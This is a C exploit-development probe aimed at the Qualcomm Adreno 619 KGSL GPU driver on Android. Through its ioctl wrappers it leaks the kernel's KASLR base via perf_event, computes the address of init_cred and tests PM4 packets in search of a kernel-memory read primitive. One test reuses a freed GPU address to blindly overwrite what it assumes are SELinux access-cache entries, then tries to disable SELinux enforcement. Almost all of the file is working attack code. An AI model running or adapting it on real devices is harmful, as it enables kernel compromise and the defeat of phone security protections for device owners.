/*
 * read_probe.c - Probe for read primitives on Adreno 619
 * Build: aarch64-linux-android-gcc -static -o read_probe read_probe.c -lpthread
 *
 * Tests all possible PM4 packets and register combinations to find
 * a way to read kernel memory without CP_MEM_TO_MEM.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <linux/perf_event.h>
#include <asm/unistd.h>
#include <sys/stat.h>
#include <time.h>
#include <signal.h>

/* ==================== KGSL ioctl ==================== */
#define KGSL_IOC_TYPE 0x09

struct kgsl_gpuobj_alloc {
    uint64_t size; uint64_t flags; uint64_t va_len;
    uint64_t mmapsize; unsigned int id;
    unsigned int metadata_len; uint64_t metadata;
};
#define IOCTL_KGSL_GPUOBJ_ALLOC _IOWR(KGSL_IOC_TYPE, 0x45, struct kgsl_gpuobj_alloc)

struct kgsl_gpuobj_free { uint64_t flags; uint64_t priv; unsigned int id; unsigned int type; unsigned int len; unsigned int __pad; };
#define IOCTL_KGSL_GPUOBJ_FREE _IOW(KGSL_IOC_TYPE, 0x46, struct kgsl_gpuobj_free)

struct kgsl_gpuobj_info { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_INFO _IOWR(KGSL_IOC_TYPE, 0x47, struct kgsl_gpuobj_info)

struct kgsl_gpuobj_import { uint64_t priv; uint64_t priv_len; uint64_t flags; unsigned int type; unsigned int id; };
#define IOCTL_KGSL_GPUOBJ_IMPORT _IOWR(KGSL_IOC_TYPE, 0x48, struct kgsl_gpuobj_import)

struct kgsl_gpuobj_import_useraddr { uint64_t virtaddr; };

struct kgsl_drawctxt_create { unsigned int flags; unsigned int drawctxt_id; };
#define IOCTL_KGSL_DRAWCTXT_CREATE _IOWR(KGSL_IOC_TYPE, 0x13, struct kgsl_drawctxt_create)

struct kgsl_command_object { uint64_t offset; uint64_t gpuaddr; uint64_t size; unsigned int flags; unsigned int id; };

struct kgsl_gpu_command {
    uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs;
    uint64_t synclist; unsigned int syncsize, numsyncs;
    unsigned int context_id, timestamp;
};
#define IOCTL_KGSL_GPU_COMMAND _IOWR(KGSL_IOC_TYPE, 0x4A, struct kgsl_gpu_command)

struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, timestamp; };
#define IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID _IOWR(KGSL_IOC_TYPE, 0x16, struct kgsl_cmdstream_readtimestamp_ctxtid)

#define KGSL_MEMFLAGS_USE_CPU_MAP (1ULL << 28)
#define KGSL_CACHEMODE_SHIFT 0
#define KGSL_CACHEMODE_MASK 3
#define KGSL_CACHEMODE_WRITEBACK 3
#define KGSL_USER_MEM_TYPE_ADDR 2
#define KGSL_CONTEXT_PREAMBLE 0x00000010
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000002
#define KGSL_CMDLIST_IB 0x00000001U
#define KGSL_TIMESTAMP_RETIRED 0x00000002

#define VMLINUX_TEXT 0xffffffc010080000ULL
#define VMLINUX_INIT_CRED_OFFSET 0x26fa738

static int kgsl_fd = -1;
static int verbose = 1;

static void die(const char *msg) { perror(msg); exit(1); }
static void debug(int lvl, const char *fmt, ...) {
    if (lvl > verbose) return;
    va_list args;
    va_start(args, fmt);
    vprintf(fmt, args);
    va_end(args);
}

/* ==================== PM4 ==================== */
#define CP_NOP         0x10
#define CP_MEM_WRITE   0x3D
#define CP_REG_TO_MEM  0x3E
#define CP_MEM_TO_REG  0x42
#define CP_WAIT_REG_MEM 0x3C
#define CP_INDIRECT_BUFFER_PFD 0x37 /* type3 */

static uint32_t pm4_parity(uint32_t v) {
    return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
}
static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
    return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
}
static uint32_t cp_type3(uint32_t opcode, uint32_t cnt) {
    return (3<<30) | ((cnt-1)<<16) | (opcode<<8);
}
static void split64(uint64_t addr, uint32_t *lo, uint32_t *hi) {
    *lo = (uint32_t)addr; *hi = (uint32_t)(addr >> 32);
}

/* ==================== KGSL wrappers ==================== */
static int gpuobj_alloc(uint64_t size, uint64_t flags) {
    struct kgsl_gpuobj_alloc a = { .size = size, .flags = flags };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) { debug(0, "alloc fail: errno=%d\n", errno); return -1; }
    return a.id;
}
static void gpuobj_free(unsigned int id) {
    struct kgsl_gpuobj_free f = { .id = id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f);
}
static void *gpuobj_mmap(size_t size, unsigned int id) {
    return mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
}
static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
    struct kgsl_gpuobj_info inf = { .id = id };
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
    if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
    return ret;
}
static unsigned int create_context(void) {
    struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
    return c.drawctxt_id;
}
static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
    struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int i = 0; i < 100000; i++) {
        if (ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &r) != 0) return -1;
        if (r.timestamp >= target) return 0;
        usleep(100);
    }
    return -2;
}
static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
    size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
    struct kgsl_command_object cmd_obj = {
        .gpuaddr = ib_gpuaddr, .size = ib_bytes,
        .flags = KGSL_CMDLIST_IB, .id = ib_id
    };
    struct kgsl_gpu_command gc = {0};
    gc.cmdlist = (uint64_t)(uintptr_t)&cmd_obj;
    gc.cmdsize = sizeof(cmd_obj);
    gc.numcmds = 1;
    gc.context_id = ctx_id;
    int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gc);
    if (out_ts) *out_ts = gc.timestamp;
    return ret;
}

/* ==================== Run command ==================== */
static int run_cmd(uint32_t *cmd, int dwords,
                   uint64_t ib_ga, void *ib_m,
                   unsigned int ctx_id, unsigned int ib_id) {
    memcpy(ib_m, cmd, dwords * 4);
    __sync_synchronize();
    unsigned int ts;
    if (submit_ib(ctx_id, ib_ga, dwords * 4, ib_id, &ts) < 0) return -1;
    if (wait_timestamp(ctx_id, ts) < 0) return -2;
    __sync_synchronize();
    return 0;
}

/* ==================== KASLR ==================== */
static uint64_t detect_kaslr(void) {
    struct perf_event_attr pe = {0};
    pe.type = PERF_TYPE_HARDWARE;
    pe.size = sizeof(pe);
    pe.config = PERF_COUNT_HW_CPU_CYCLES;
    pe.sample_type = PERF_SAMPLE_IP;
    pe.sample_period = 100;
    pe.disabled = 1;
    pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;

    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
    if (fd < 0) return 0;

    int npages = 256;
    size_t mmap_size = (1 + npages) * 4096;
    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
    if (buf == MAP_FAILED) { close(fd); return 0; }

    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
    usleep(500000);
    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
    uint64_t head = pmp->data_head;
    uint64_t tail = pmp->data_tail;
    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
    uint64_t data_size = pmp->data_size;

    uint64_t first_ip = 0;
    while (tail < head) {
        uint64_t idx = tail & (data_size - 1);
        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
            first_ip = *(uint64_t *)(hdr + 1);
            break;
        }
        tail += hdr->size;
    }
    munmap(buf, mmap_size);
    close(fd);
    if (first_ip == 0) return 0;
    return (first_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
}

/* ==================== Test: read via CP_REG_TO_MEM with different regs ==================== */
static void test_reg_reads(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *dst_m,
                           unsigned int ctx_id, unsigned int ib_id) {
    printf("\n[*] Testing CP_REG_TO_MEM with various registers\n");
    uint32_t regs[] = {
        0x00000400, 0x00000404, 0x00000408, 0x0000040C, 0x00000410,
        0x00000414, 0x00000418, 0x0000041C, 0x00000420, 0x00000424,
        0x00000428, 0x0000042C, 0x00000430, 0x00000434, 0x00000438,
        0x0000043C, 0x00000440, 0x00000444, 0x00000448, 0x0000044C,
        0x00000600, 0x00000604, 0x00000608, 0x0000060C, 0x00000610,
        0x00000800, 0x00000804, 0x00000808, 0x0000080C, 0x00000810,
    };
    for (int i = 0; i < sizeof(regs)/sizeof(regs[0]); i++) {
        uint32_t cmd[16];
        int dw = 0;
        uint32_t lo, hi;
        split64(dst_ga, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_REG_TO_MEM, 4);
        cmd[dw++] = regs[i];
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        memset(dst_m, 0, 16);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
            uint64_t val = *(uint64_t*)dst_m;
            if (val != 0)
                printf("  REG 0x%04X = 0x%016lx\n", regs[i], val);
        }
    }
}

/* ==================== Test: read via CP_WAIT_REG_MEM + timestamp ==================== */
static void test_wait_read(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *dst_m,
                           unsigned int ctx_id, unsigned int ib_id) {
    printf("\n[*] Testing CP_WAIT_REG_MEM for reading (compare with memory)\n");
    // Write a known value to dst_ga
    uint32_t cmd[32];
    int dw = 0;
    uint32_t lo, hi;
    split64(dst_ga, &lo, &hi);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    cmd[dw++] = lo; cmd[dw++] = hi;
    cmd[dw++] = 0x12345678; cmd[dw++] = 0;
    cmd[dw++] = cp_type7(CP_NOP, 0);
    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) < 0) {
        printf("  Failed to write test value\n");
        return;
    }

    // Try to read from a register that might contain the value
    // We can't read directly, but we can use CP_WAIT_REG_MEM to wait for a register to equal a value
    // If the register value matches what we expect, we know it's readable.
    // But we need to know the register address. Maybe the GPU timestamp register?
    // Let's try to read the timestamp register (0x00000400 is often the timestamp)
    uint32_t ts_reg = 0x00000400;
    dw = 0;
    split64(dst_ga, &lo, &hi);
    cmd[dw++] = cp_type7(CP_NOP, 0);
    cmd[dw++] = cp_type7(CP_WAIT_REG_MEM, 6);
    cmd[dw++] = ts_reg;
    cmd[dw++] = lo; cmd[dw++] = hi;  // compare with dst_ga value
    cmd[dw++] = 0x12345678;          // expected value
    cmd[dw++] = 0xFFFFFFFF;          // mask
    cmd[dw++] = 0;                   // ?
    cmd[dw++] = cp_type7(CP_NOP, 0);

    // We need to use a timeout, but run_cmd will wait indefinitely if condition not met.
    // So we'll use a separate thread with timeout, but for simplicity we just try.
    // Actually, we can use the wait_timestamp function to set a timeout.
    // But for now, just try and see if it succeeds quickly.
    int ret = run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id);
    printf("  CP_WAIT_REG_MEM: ret=%d (if 0, register matches value)\n", ret);
}

/* ==================== Test: read via CP_INDIRECT_BUFFER_PFD ==================== */
static void test_indirect_buffer(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *dst_m,
                                 unsigned int ctx_id, unsigned int ib_id) {
    printf("\n[*] Testing CP_INDIRECT_BUFFER_PFD (type3) for reading\n");
    // We need a secondary IB that contains some data.
    // Allocate a small IB.
    int ib2_id = gpuobj_alloc(0x1000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
    if (ib2_id < 0) { printf("  Failed to allocate second IB\n"); return; }
    void *ib2_m = gpuobj_mmap(0x1000, ib2_id);
    if (!ib2_m) { gpuobj_free(ib2_id); return; }
    uint64_t ib2_ga = 0;
    gpuobj_info(ib2_id, &ib2_ga);

    // Write some data to the second IB
    memset(ib2_m, 0, 0x1000);
    uint32_t *data = (uint32_t*)ib2_m;
    data[0] = 0xDEADBEEF;
    data[1] = 0xCAFEBABE;
    __sync_synchronize();

    // Now execute the main IB that jumps to the second IB
    uint32_t cmd[32];
    int dw = 0;
    // Type3 packet for CP_INDIRECT_BUFFER_PFD
    // Format: opcode=0x37, count=2 (header + 2 dwords for address and size?)
    // For type3, count is number of dwords after header, so for address+size = 2 dwords.
    // But for 64-bit address, we need two dwords for address and one for size? Actually depends.
    // In adreno_pm4types.h, CP_INDIRECT_BUFFER_PFD is type3 with opcode 0x37.
    // The format is: header, then 64-bit address (2 dwords), then 32-bit size (1 dword).
    // So total count = 3.
    cmd[dw++] = cp_type3(CP_INDIRECT_BUFFER_PFD, 3);
    uint32_t lo, hi;
    split64(ib2_ga, &lo, &hi);
    cmd[dw++] = lo;
    cmd[dw++] = hi;
    cmd[dw++] = 0x1000; // size in bytes? or dwords? Usually bytes.
    cmd[dw++] = cp_type7(CP_NOP, 0);

    // We also need to write something to dst_ga to see if the indirect buffer executed.
    // But we can't read it directly. However, if the indirect buffer writes to dst_ga,
    // then we can see the effect. But we need to know if it executed.
    // Let's include a CP_MEM_WRITE in the second IB that writes to dst_ga.
    // We already have data in ib2_m, but it's not a valid command stream.
    // We need to build a proper command stream in ib2_m.
    uint32_t *ib2_cmd = (uint32_t*)ib2_m;
    dw = 0;
    ib2_cmd[dw++] = cp_type7(CP_NOP, 0);
    split64(dst_ga, &lo, &hi);
    ib2_cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
    ib2_cmd[dw++] = lo; ib2_cmd[dw++] = hi;
    ib2_cmd[dw++] = 0xDEADBEEF; ib2_cmd[dw++] = 0xCAFEBABE;
    ib2_cmd[dw++] = cp_type7(CP_NOP, 0);
    __sync_synchronize();

    // Now run the main IB with indirect
    memset(dst_m, 0, 16);
    if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0) {
        uint64_t val = *(uint64_t*)dst_m;
        printf("  Indirect buffer wrote to dst_ga: 0x%016lx %s\n", val,
               (val == 0xCAFEBABEDEADBEEFULL) ? "[OK]" : "[FAIL]");
    } else {
        printf("  Indirect buffer execution failed\n");
    }

    munmap(ib2_m, 0x1000);
    gpuobj_free(ib2_id);
}

/* ==================== Test: read via kernel address in IB? ==================== */
static void test_kernel_read_ib(uint64_t ib_ga, void *ib_m, uint64_t dst_ga, void *dst_m,
                                unsigned int ctx_id, unsigned int ib_id,
                                uint64_t kernel_addr) {
    printf("\n[*] Testing if IB can read from kernel address (via CP_MEM_TO_MEM?)\n");
    // We already know CP_MEM_TO_MEM doesn't work, but maybe as part of IB?
    // Try to issue CP_MEM_WRITE from kernel address to dst_ga? That would be writing, not reading.
    // Actually CP_MEM_WRITE writes from the command stream, not from memory.
    // We need a way to copy from kernel address to GPU memory. That's CP_MEM_TO_MEM.
    // Since it doesn't work, we can't.
    // But we can try to use CP_REG_TO_MEM after setting a register to kernel address?
    // We already tried indirect read via register and it failed.
    // So just print a message.
    printf("  CP_MEM_TO_MEM is known to be broken. Skipping.\n");
}

/* ==================== Test: UAF reuse + blind write ==================== */
static void test_uaf_blind_write(uint64_t ib_ga, void *ib_m,
                                 unsigned int ctx_id, unsigned int ib_id,
                                 uint64_t init_cred_addr) {
    printf("\n[*] Testing UAF reuse + blind AVC write (no read)\n");
    // Use non-CPU-mapped objects to get GPU addresses.
    uint64_t flags = KGSL_CACHEMODE_WRITEBACK;

    // Allocate large object
    int large_id = gpuobj_alloc(0x1000000, flags);
    if (large_id < 0) { printf("  Large alloc failed\n"); return; }
    uint64_t large_ga = 0;
    gpuobj_info(large_id, &large_ga);
    printf("  Large object gpuaddr=0x%lx\n", large_ga);
    gpuobj_free(large_id);

    // Allocate small object to reuse address
    int small_id = gpuobj_alloc(0x1000, flags);
    if (small_id < 0) { printf("  Small alloc failed\n"); return; }
    uint64_t small_ga = 0;
    gpuobj_info(small_id, &small_ga);
    printf("  Small object gpuaddr=0x%lx (reuse? %s)\n", small_ga,
           (small_ga == large_ga) ? "[YES]" : "[NO]");

    if (small_ga != large_ga) {
        printf("  Address not reused, cannot proceed.\n");
        gpuobj_free(small_id);
        return;
    }

    // Now blindly write 0xFFFFFFFF to allowed field of potential AVC nodes
    // AVC node stride is 72, offset 0xc is allowed.
    printf("  Blindly writing allowed=0xFFFFFFFF at offsets 0x%lx - 0x%lx\n",
           small_ga + 0x200, small_ga + 0x800);
    int writes = 0;
    for (uint64_t off = 0x200; off < 0x800; off += 72) {
        uint64_t target = small_ga + off + 0xc;
        uint32_t cmd[16];
        int dw = 0;
        uint32_t lo, hi;
        split64(target, &lo, &hi);
        cmd[dw++] = cp_type7(CP_NOP, 0);
        cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
        cmd[dw++] = lo; cmd[dw++] = hi;
        cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0;
        cmd[dw++] = cp_type7(CP_NOP, 0);
        if (run_cmd(cmd, dw, ib_ga, ib_m, ctx_id, ib_id) == 0)
            writes++;
    }
    printf("  Wrote %d potential AVC nodes\n", writes);

    // Try setenforce 0
    int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
    int ok = 0;
    if (fd >= 0) {
        if (write(fd, "0", 1) == 1) ok = 1;
        close(fd);
    }
    printf("  setenforce 0: %s\n", ok ? "SUCCESS" : "FAIL");

    gpuobj_free(small_id);
}

/* ==================== Main ==================== */
int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf("=== Read Primitive Probe for Adreno 619 ===\n");

    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) die("open kgsl");
    printf("[+] kgsl fd=%d\n", kgsl_fd);

    uint64_t kaslr = detect_kaslr();
    if (!kaslr) { printf("[-] KASLR detection failed\n"); close(kgsl_fd); return 1; }
    printf("[+] KASLR = 0x%lx\n", kaslr);
    uint64_t init_cred_addr = kaslr + VMLINUX_INIT_CRED_OFFSET;
    printf("[*] init_cred = 0x%lx\n", init_cred_addr);

    /* Allocate objects */
    uint64_t flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
    int ib_id = gpuobj_alloc(0x10000, flags);
    if (ib_id < 0) die("ib alloc");
    void *ib_m = gpuobj_mmap(0x10000, ib_id);
    if (!ib_m) die("ib mmap");
    uint64_t ib_ga = 0;
    gpuobj_info(ib_id, &ib_ga);
    printf("[*] IB id=%d gpuaddr=0x%lx\n", ib_id, ib_ga);

    int dst_id = gpuobj_alloc(0x4000, flags);
    if (dst_id < 0) die("dst alloc");
    void *dst_m = gpuobj_mmap(0x4000, dst_id);
    if (!dst_m) die("dst mmap");
    uint64_t dst_ga = 0;
    gpuobj_info(dst_id, &dst_ga);
    printf("[*] DST id=%d gpuaddr=0x%lx\n", dst_id, dst_ga);

    unsigned int ctx_id = create_context();
    printf("[*] Context id=%u\n", ctx_id);

    /* Run tests */
    test_reg_reads(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
    test_wait_read(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
    test_indirect_buffer(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id);
    test_kernel_read_ib(ib_ga, ib_m, dst_ga, dst_m, ctx_id, ib_id, init_cred_addr);
    test_uaf_blind_write(ib_ga, ib_m, ctx_id, ib_id, init_cred_addr);

    close(kgsl_fd);
    printf("\n[*] Probe finished.\n");
    return 0;
}
